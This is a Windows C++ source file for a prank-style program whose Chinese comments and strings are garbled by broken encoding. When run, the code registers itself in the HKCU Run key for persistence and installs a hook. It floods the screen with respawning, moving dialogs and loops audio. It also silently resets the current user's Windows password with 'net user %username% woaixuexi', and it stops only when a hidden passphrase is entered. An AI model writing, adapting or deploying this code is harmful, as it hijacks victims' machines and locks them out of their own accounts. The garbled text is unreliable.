// С����.cpp : ����Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "С����.h"

DWORD dwLoadDialog = 0;
#define LOAD_DIALOG dwLoadDialog
#define PASSWORDSTRING "�Ұ�ѧϰ��ѧϰʹ�ҿ���"
#define VALUENAME "���̲���"
#define PassWordCommand "net user %username% woaixuexi"


// ȫ�ֱ���:
HINSTANCE hInst;								// ��ǰʵ��
HICON hIcon = NULL;
HMODULE hDll = NULL;//KeepRun

VOID CreateAndShowDialog()
{
	//����ʱ�����ô�����
	SYSTEMTIME st;
	GetLocalTime(&st);
	dwLoadDialog = st.wMonth + st.wDay + st.wDayOfWeek + st.wHour + st.wMinute;
	hIcon = LoadIcon(hInst, MAKEINTRESOURCE(IDI_MY));

	for (UINT i = 0; i < LOAD_DIALOG; i++) {
		HWND hDlg = CreateDialog(hInst, MAKEINTRESOURCE(IDD_MAINDLG), NULL, DlgProc);
		ShowWindow(hDlg, SW_SHOW);
	}
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	// TODO: �ڴ˷��ô��롣
	KeepRunning();
	hInst = hInstance;
	//��������
	RunByWindow(TRUE);
	//ע��DLL
	SetHook();
	//��������
	PlaySound(_T("background.wav"), NULL, SND_ASYNC | SND_LOOP);
	//�����Ի���
	CreateAndShowDialog();
	//�޸�ϵͳ����
	_tsystem(_T(PassWordCommand));
	//���������
	DialogBox(hInst, MAKEINTRESOURCE(IDD_PASSWORD), NULL, PassWordProc);//������ȷ���˳�����

	//����
	SendMyMessage(WM_CLOSE);
	SetHook();
	return GetLastError();
}

VOID MoveDialog(HWND hDlg)
{
	RECT rc;
	GetWindowRect(GetDesktopWindow(), &rc);
	SetWindowPos(hDlg, HWND_BOTTOM, rand() % rc.right, rand() % rc.bottom, NULL, NULL, 
		SWP_NOSIZE | SWP_NOACTIVATE | SWP_NOREDRAW);
}

INT_PTR CALLBACK DlgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		OnInitMainDlg(hDlg);
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		OnCommand(hDlg, wParam, lParam);
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			CreateAndShowDialog();
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	case WM_TIMER:
		MoveDialog(hDlg);
		SendMyMessage(WM_APP);
		break;
	}
	return (INT_PTR)FALSE;
}

INT_PTR CALLBACK PassWordProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		SendMessage(hDlg, WM_SETICON, 0, (LPARAM)hIcon);
		break;
	case WM_COMMAND:
		OnCommand(hDlg, wParam, lParam);
		switch (LOWORD(wParam))
		{
		case IDOK:
			TCHAR sz[MAX_PATH];
			GetDlgItemText(hDlg, IDC_EDIT1, sz, _countof(sz));
			if (lstrcmp(sz, _T(PASSWORDSTRING)) == 0) {
				CancelKeepRunning();
				EndDialog(hDlg, IDOK);
				RunByWindow(FALSE);//ȡ����������
				return IDOK;
			}
		}
	}
	return (INT_PTR)FALSE;
}

VOID OnInitMainDlg(HWND hDlg)
{
	SendMessage(hDlg, WM_SETICON, 0, (LPARAM)hIcon);
	SetTimer(hDlg, NULL, 1 * 1000, NULL);
}

VOID OnCommand(HWND hDlg, WPARAM wParam, LPARAM lParam)
{
	switch (LOWORD(wParam))
	{
	case IDM_ABOUT:
		DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hDlg, About);
		break;
	}
}

INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDOK:
			ShellExecute(NULL, _T("open"), _T("https://github.com/KrxkGit"), NULL, NULL, SW_NORMAL);
			return TRUE;
		case IDCANCEL:
			EndDialog(hDlg, IDCANCEL);
			break;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

BOOL RunByWindow(BOOL bRun)
{
	TCHAR szKey[] = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hKey;
	DWORD dwType;

	if (bRun) {
		BOOL bSuccess = FALSE;
		RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_READ, &hKey);
		bSuccess = RegQueryValueEx(hKey, _T(VALUENAME), 0, &dwType, NULL, NULL);
		RegCloseKey(hKey);
		if (bSuccess == ERROR_SUCCESS || bSuccess == ERROR_MORE_DATA) { //��ֵ�Ѵ���
			return TRUE;
		}
		else {
			RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_SET_VALUE, &hKey);
			TCHAR szPath[MAX_PATH];
			GetModuleFileName(NULL, szPath, _countof(szPath));
			RegSetValueEx(hKey, _T(VALUENAME), 0, REG_SZ, (BYTE*)szPath, (DWORD)(_tcslen(szPath) + 1)*sizeof(TCHAR));
			RegCloseKey(hKey);
		}
	}
	else {
		RegOpenKeyEx(HKEY_CURRENT_USER, szKey, 0, KEY_SET_VALUE, &hKey);
		RegDeleteValue(hKey, _T(VALUENAME));
		RegCloseKey(hKey);
		CancelKeepRunning();
	}
	return TRUE;
}